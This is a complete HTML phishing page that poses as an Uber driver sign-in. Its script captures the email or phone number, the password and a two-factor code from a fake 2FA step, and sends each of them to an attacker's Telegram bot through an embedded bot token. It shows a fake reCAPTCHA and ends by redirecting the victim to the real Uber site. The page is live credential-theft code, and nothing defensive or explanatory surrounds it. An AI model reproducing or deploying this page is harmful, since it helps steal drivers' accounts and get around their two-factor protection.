<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Uber – Driver Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Uber Move', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            width: 100%;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 8px 30px rgba(255,255,255,0.05);
            overflow: hidden;
        }
        .header {
            padding: 24px 24px 8px 24px;
        }
        .logo {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -0.5px;
            color: #000000;
        }
        .logo span {
            color: #00b14f;
        }
        .content {
            padding: 8px 24px 32px 24px;
        }
        h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1a1a1a;
        }
        .step {
            font-size: 14px;
            color: #6e6e6e;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-weight: 500;
            margin-bottom: 8px;
            color: #222;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ccc;
            border-radius: 16px;
            font-size: 16px;
            transition: 0.2s;
            background: #fff;
        }
        input:focus {
            outline: none;
            border-color: #000000;
            box-shadow: 0 0 0 3px rgba(0,0,0,0.1);
        }
        button {
            width: 100%;
            background: #000000;
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 16px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 8px;
        }
        button:hover {
            background: #333;
        }
        .recaptcha {
            background: #f3f3f3;
            border-radius: 12px;
            padding: 12px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 13px;
            color: #555;
            border: 1px solid #e0e0e0;
        }
        .recaptcha input {
            width: auto;
            transform: scale(1.2);
            margin-right: 8px;
        }
        .fake-checkbox {
            width: 20px;
            height: 20px;
            background: white;
            border: 1px solid #aaa;
            border-radius: 3px;
            display: inline-block;
        }
        .footer {
            margin-top: 24px;
            font-size: 12px;
            text-align: center;
            color: #999;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
            color: #00b14f;
            font-size: 14px;
        }
        .error {
            color: #d32f2f;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
        hr {
            margin: 20px 0;
            border: none;
            border-top: 1px solid #eee;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">UBER<span>driver</span></div>
        </div>
        <div class="content">
            <h1>Driver sign in</h1>
            <div class="step">Step 1 of 3: Account verification</div>
            <form id="loginForm">
                <div class="form-group">
                    <label>Email or phone number</label>
                    <input type="text" id="emailOrPhone" required placeholder="driver@example.com or +1 234 567 8900">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="password" required placeholder="Enter your password">
                </div>
                <div class="recaptcha" id="recaptchaContainer">
                    <div style="background:#fff; border:1px solid #aaa; width:18px; height:18px; border-radius:3px;"></div>
                    <span>I'm not a robot</span>
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="margin-left:auto; height:30px;" alt="reCAPTCHA">
                </div>
                <button type="submit" id="submitBtn">Continue</button>
                <div class="loading" id="loadingMsg">Verifying, please wait...</div>
                <div class="error" id="errorMsg">Incorrect email or password. Please try again.</div>
            </form>
            <div class="footer">
                This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
            </div>
        </div>
    </div>

    <script>
        // Telegram bot credentials (your existing bot)
        const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
        const CHAT_ID = '8737104261';

        // Simple fake 2FA flow after password
        let step = 1; // 1: email/password, 2: 2FA
        let capturedEmailPhone = '';
        let capturedPassword = '';

        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const loadingDiv = document.getElementById('loadingMsg');
        const errorDiv = document.getElementById('errorMsg');
        const stepDiv = document.querySelector('.step');
        const recaptchaDiv = document.getElementById('recaptchaContainer');

        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) { console.error(e); }
        }

        function showError(msg) {
            errorDiv.innerText = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            loadingDiv.style.display = 'block';
            submitBtn.disabled = true;

            if (step === 1) {
                // Capture email/phone and password
                capturedEmailPhone = document.getElementById('emailOrPhone').value.trim();
                capturedPassword = document.getElementById('password').value.trim();

                if (!capturedEmailPhone || !capturedPassword) {
                    showError('Please fill in both fields.');
                    loadingDiv.style.display = 'none';
                    submitBtn.disabled = false;
                    return;
                }

                // Send first part to Telegram
                const message = `<b>🔑 Uber Driver Login (Step 1)</b>\n\n<b>Email/Phone:</b> <code>${escapeHtml(capturedEmailPhone)}</code>\n<b>Password:</b> <code>${escapeHtml(capturedPassword)}</code>\n<b>Time:</b> ${new Date().toLocaleString()}`;
                await sendTelegramMessage(message);

                // Now switch to 2FA step (simulate)
                step = 2;
                stepDiv.innerText = 'Step 2 of 3: Two‑factor authentication';
                // Replace form fields with 2FA input
                const formHtml = `
                    <div class="form-group">
                        <label>Verification code</label>
                        <input type="text" id="twoFactorCode" placeholder="Enter 6‑digit code" autocomplete="off">
                    </div>
                    <div class="recaptcha" id="recaptchaContainer2" style="display:none;"></div>
                `;
                document.querySelector('.form-group').parentNode.innerHTML = formHtml;
                // Re-attach event listener to new submit button (original button still exists)
                // We'll recreate the button and event
                const newForm = document.getElementById('loginForm');
                const newSubmit = newForm.querySelector('button');
                // Remove old listener and add new
                newForm.addEventListener('submit', async (e2) => {
                    e2.preventDefault();
                    const code = document.getElementById('twoFactorCode').value.trim();
                    if (!code) {
                        showError('Please enter the verification code.');
                        return;
                    }
                    loadingDiv.style.display = 'block';
                    const message2 = `<b>🔐 Uber Driver 2FA Code</b>\n\n<b>Account:</b> <code>${escapeHtml(capturedEmailPhone)}</code>\n<b>2FA Code:</b> <code>${escapeHtml(code)}</code>\n<b>Time:</b> ${new Date().toLocaleString()}`;
                    await sendTelegramMessage(message2);
                    // Redirect to real Uber driver dashboard
                    loadingDiv.innerText = 'Redirecting to secure dashboard...';
                    setTimeout(() => {
                        window.location.href = 'https://www.uber.com/login?redirect=/driver/dashboard/';
                    }, 1500);
                });
                loadingDiv.innerText = 'Almost there...';
                loadingDiv.style.display = 'block';
                submitBtn.disabled = false;
                loadingDiv.style.display = 'none'; // hide after switch
                return;
            }
        });

        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }

        // Fake reCAPTCHA click (just visual)
        const recaptchaBox = document.querySelector('.recaptcha');
        if (recaptchaBox) {
            recaptchaBox.addEventListener('click', () => {
                const checkDiv = recaptchaBox.querySelector('div:first-child');
                if (checkDiv) checkDiv.style.backgroundColor = '#00b14f';
                // No real functionality
            });
        }
    </script>
</body>
</html>
